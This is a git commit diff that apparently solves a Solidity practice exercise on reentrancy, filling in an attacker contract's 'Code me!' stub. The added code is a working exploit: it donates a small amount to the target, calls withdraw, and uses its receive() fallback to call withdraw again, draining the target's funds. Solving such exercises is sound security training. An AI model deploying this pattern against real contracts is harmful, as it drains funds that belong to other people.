3e8b98c8d1e8306ad92af8858fd9624106f5f0d2
Swapneel Bobba <swapneel.bobba123@gmail.com>
2022-05-23 00:31:07 -0400

    Reentrance solution

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,21 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance public reentrance;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentrance = Reentrance(_contractAddress);
+    }
+
+    receive() external payable {
+        reentrance.withdraw();
     }
 
     function hackContract() external {
         // Code me!
+        require(address(this).balance >= 1);
+        reentrance.donate{value: 1}(address(payable(this)));
+        reentrance.withdraw();
     }
 }
